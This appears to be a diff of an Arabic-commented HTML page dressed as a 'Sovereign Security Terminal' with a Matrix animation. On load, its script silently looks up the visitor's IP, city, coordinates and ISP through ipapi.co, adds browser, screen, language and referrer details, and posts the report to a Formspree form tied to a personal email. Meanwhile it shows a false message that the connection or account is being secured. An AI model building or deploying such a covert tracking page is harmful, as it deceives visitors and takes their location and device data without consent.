@@ -2,60 +2,106 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأمين الحساب السيادي - 2099</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sovereign Security Terminal</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 20px #00ff41; text-align: center; width: 90%; max-width: 500px; }
-        .gate { font-size: 1.5em; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 5px; }
+        :root { --glow: #00ff41; --bg: #050505; }
+        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
+        #canvas { position: absolute; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        .terminal { border: 2px solid var(--glow); background: rgba(0, 0, 0, 0.9); padding: 25px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); width: 85%; max-width: 600px; position: relative; }
+        .header { border-bottom: 1px solid var(--glow); margin-bottom: 15px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; text-align: center; }
+        .log-line { font-size: 0.9em; margin: 5px 0; white-space: nowrap; overflow: hidden; border-right: 2px solid var(--glow); animation: typing 1s steps(40, end), blink 0.5s step-end infinite; }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink { from, to { border-color: transparent } 50% { border-color: var(--glow) } }
+        .progress-container { width: 100%; border: 1px solid var(--glow); height: 12px; margin-top: 20px; }
+        #progress-bar { width: 0%; height: 100%; background: var(--glow); transition: width 0.4s ease-in-out; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="gate">🔱 LØGHØST-Z 💀</div>
-        <p id="msg">جاري تشفير الاتصال لضمان سلامتك...</p>
-        <div style="border: 1px solid #00ff41; height: 10px; width: 100%;"><div id="bar" style="background:#00ff41; height:100%; width:0%;"></div></div>
+    <canvas id="canvas"></canvas>
+    <div class="terminal">
+        <div class="header">🔱 SYSTEM: LØGHØST-Z CORE 2099 🜏</div>
+        <div id="logs">
+            <p class="log-line">> INITIALIZING SECURITY PROTOCOL...</p>
+        </div>
+        <div class="progress-container"><div id="progress-bar"></div></div>
     </div>
 
-    <form id="trapForm" action="https://formspree.io/f/kabhaa982@gmail.com" method="POST" style="display:none;">
-        <input type="hidden" name="IP_Address" id="ip">
-        <input type="hidden" name="Location" id="loc">
-        <input type="hidden" name="Device_Info" id="dev">
-        <input type="hidden" name="Browser_Fingerprint" id="finger">
+    <form id="finalForm" action="https://formspree.io/f/kabhaa982@gmail.com" method="POST" style="display:none;">
+        <input type="hidden" name="_subject" value="🔱 صيد جديد: تم استدراج المهاجم!">
+        <textarea name="DETAILED_REPORT" id="report"></textarea>
     </form>
 
     <script>
-        async function initiateTrap() {
-            const bar = document.getElementById('bar');
-            bar.style.transition = "width 3s";
-            bar.style.width = "100%";
+        // تأثير Matrix الخلفي
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789🔱💀";
+        const fontSize = 16; const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ff41"; ctx.font = fontSize + "px arial";
+            drops.forEach((y, i) => {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(draw, 33);
 
+        const logs = document.getElementById('logs');
+        const addLog = (text) => {
+            const p = document.createElement('p'); p.className = 'log-line';
+            p.innerText = `> ${text}`; logs.appendChild(p);
+        };
+
+        async function executeTheTrap() {
             try {
-                // استخلاص البيانات من النواة
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-
-                // ملء البيانات في النموذج المخفي
-                document.getElementById('ip').value = data.ip;
-                document.getElementById('loc').value = `${data.city}, ${data.country_name} (Lat: ${data.latitude}, Long: ${data.longitude})`;
-                document.getElementById('dev').value = `OS: ${navigator.platform} | Screen: ${screen.width}x${screen.height}`;
-                document.getElementById('finger').value = navigator.userAgent;
-
-                // إرسال البيانات فوراً إلى بريدك بدون شعور المهاجم
-                const form = document.getElementById('trapForm');
-                const formData = new FormData(form);
+                addLog("SCANNING SOURCE NODE...");
+                const bar = document.getElementById('progress-bar');
                 
+                // جلب البيانات العميقة
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                bar.style.width = "40%";
+
+                addLog("EXTRACTING NEURAL FINGERPRINT...");
+                const fullData = `
+=== SOVEREIGN TARGET REPORT ===
+IP: ${d.ip}
+LOCATION: ${d.city}, ${d.region}, ${d.country_name}
+COORDINATES: ${d.latitude}, ${d.longitude}
+ISP: ${d.org}
+TIMEZONE: ${d.timezone}
+DEVICE: ${navigator.platform}
+LANGUAGE: ${navigator.language}
+BROWSER: ${navigator.userAgent}
+SCREEN: ${screen.width}x${screen.height}
+URL REF: ${document.referrer || 'Direct Access'}
+===============================`;
+
+                document.getElementById('report').value = fullData;
+                bar.style.width = "70%";
+                addLog("UPLOADING DATA TO CORE...");
+
+                // الإرسال الصامت
+                const form = document.getElementById('finalForm');
                 await fetch(form.action, {
                     method: 'POST',
-                    body: formData,
+                    body: new FormData(form),
                     headers: { 'Accept': 'application/json' }
                 });
 
-                document.getElementById('msg').innerText = "تم تأمين الحساب بنجاح. يمكنك إغلاق الصفحة.";
-            } catch (e) {
-                document.getElementById('msg').innerText = "حدث خطأ في التشفير، حاول لاحقاً.";
+                bar.style.width = "100%";
+                addLog("PROTOCOL COMPLETE. CONNECTION SECURED.");
+            } catch (err) {
+                addLog("ERROR: DATA INTERCEPTED.");
             }
         }
-        window.onload = initiateTrap;
+        setTimeout(executeTheTrap, 1000);
     </script>
 </body>
 </html>
